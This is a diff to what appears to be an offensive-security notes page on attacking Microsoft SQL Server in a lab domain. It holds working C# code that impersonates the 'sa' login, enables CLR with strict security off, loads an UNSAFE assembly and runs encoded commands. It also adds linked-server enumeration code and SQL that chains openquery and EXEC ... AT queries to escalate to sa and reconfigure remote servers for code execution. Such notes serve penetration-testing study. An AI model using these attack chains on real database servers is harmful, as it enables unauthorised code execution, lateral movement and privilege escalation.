@@ -13,6 +13,8 @@ tags:
   - smb
   - powershell
   - base64
+  - assembly
+  - encoded
 ---
 
 ## Enumeration
@@ -557,60 +559,137 @@ using System.Data.SqlClient;
 
 namespace SQL
 {
-class Program
-{
-    static void Main(string[] args)
-    {
-        string sqlServer = "dc01.corp1.com";
-        string database = "master";
-        string conString = "Server = " + sqlServer +
-                           "; Database = " + database +
-                           "; Integrated Security = True;";
-        string encodedCommand = args[0];
-        SqlConnection con = new SqlConnection(conString);
+	class Program
+	{
+	    static void Main(string[] args)
+	    {
+	        string sqlServer = "dc01.corp1.com";
+	        string database = "master";
+	        string conString = "Server = " + sqlServer +
+	                           "; Database = " + database +
+	                           "; Integrated Security = True;";
+	        string encodedCommand = args[0];
+	        SqlConnection con = new SqlConnection(conString);
 
-        try
-        {
-            con.Open();
-            Console.WriteLine("Auth success!");
-        }
-        catch
-        {
-            Console.WriteLine("Auth failed");
-            Environment.Exit(0);
-        }
+	        try
+	        {
+	            con.Open();
+	            Console.WriteLine("Auth success!");
+	        }
+	        catch
+	        {
+	            Console.WriteLine("Auth failed");
+	            Environment.Exit(0);
+	        }
 
-        string executeas = "EXECUTE AS LOGIN = 'sa';";
-        string enableCLR =
-            "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
-        string dropProcedure = "DROP PROCEDURE [dbo].[cmdExec];";
-        string dropAssembly = "DROP ASSEMBLY myAssembly;";
-        string createAssembly =
-            "CREATE ASSEMBLY myAssembly FROM ... WITH PERMISSION_SET = UNSAFE;";
-        string createProcedure =
-            "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
-        string cmdExec = $"EXEC cmdExec '{encodedCommand}';";
-        string[] commands = {
-            executeas,
-            enableCLR,
-            dropProcedure,
-            dropAssembly,
-            createAssembly,
-            createProcedure,
-            cmdExec
-        };
+	        string executeas = "EXECUTE AS LOGIN = 'sa';";
+	        string enableCLR =
+	            "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
+	        string dropProcedure = "DROP PROCEDURE [dbo].[cmdExec];";
+	        string dropAssembly = "DROP ASSEMBLY myAssembly;";
+	        string createAssembly =
+	            "CREATE ASSEMBLY myAssembly FROM ... WITH PERMISSION_SET = UNSAFE;";
+	        string createProcedure =
+	            "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
+	        string cmdExec = $"EXEC cmdExec '{encodedCommand}';";
+	        string[] commands = {
+	            executeas,
+	            enableCLR,
+	            dropProcedure,
+	            dropAssembly,
+	            createAssembly,
+	            createProcedure,
+	            cmdExec
+	        };
 
-        foreach (string command in commands)
-        {
-            SqlCommand SQLCommand = new SqlCommand(command, con);
-            SqlDataReader SQLReader = SQLCommand.ExecuteReader();
-            SQLReader.Read();
-            Console.WriteLine($"Result of command is: {SQLReader[0]}");
-            SQLReader.Close();
-        }
+	        foreach (string command in commands)
+	        {
+	            SqlCommand SQLCommand = new SqlCommand(command, con);
+	            SqlDataReader SQLReader = SQLCommand.ExecuteReader();
+	            SQLReader.Read();
+	            Console.WriteLine($"Result of command is: {SQLReader[0]}");
+	            SQLReader.Close();
+	        }
 
-        con.Close();
-    }
-}
+	        con.Close();
+	    }
+	}
 }
 ```
+
+## Linked servers
+
+It's possible to link SQL servers within a domain, such that a query executed on
+one SQL server fetches data from or takes action on a different SQL server.
+Here's some example C# .NET code to enumerate linked servers:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+	class Program
+	{
+	    static void Main()
+	    {
+	        string sqlServer = "dc01.corp1.com";
+	        string database = "master";
+	        string conString = "Server = " + sqlServer +
+	                           "; Database = " + database +
+	                           "; Integrated Security = True;";
+	        SqlConnection con = new SqlConnection(conString);
+
+	        try
+	        {
+	            con.Open();
+	            Console.WriteLine("Auth success!");
+	        }
+	        catch
+	        {
+	            Console.WriteLine("Auth failed");
+	            Environment.Exit(0);
+	        }
+
+	        string execCmd = "EXEC sp_linkedservers;";
+	        SqlCommand command = new SqlCommand(execCmd, con);
+	        SqlDataReader reader = command.ExecuteReader();
+
+	        while (reader.Read())
+	        {
+	            Console.WriteLine("Linked SQL server: " + reader[0]);
+	        }
+	        reader.Close();
+
+	        con.Close();
+	    }
+	}
+}
+```
+
+Once we discover linked SQL servers, we can use the following toolkits to
+conduct lateral movement, pivot, and escalate privileges:
+
+- [Evil SQL Client (ESC)](https://github.com/NetSPI/ESC)
+- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+- [Database Audit Framework & Toolkit (DAFT)](https://github.com/NetSPI/DAFT)
+
+You can chain links to conduct privilege escalation. For example, we could be
+executing the following query from the `appsrv01` host, using the `dc01` host to
+bounce our request back home, enabling us to gain `sa` privileges because we
+have `sa` privileges on the `dc01` host:
+
+```sql
+select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')
+```
+
+Unfortunately, we can't use `openquery` for `exec` command to reconfigure remote
+servers for code execution, but we can use the `at` directive, as such:
+
+```sql
+EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
+```
+
+Executing the above SQL command from the `appsrv01` host allows us to execute
+our `exec` and `reconfigure` commands as `sa`, bouncing our SQL command off the
+`dc01` host.
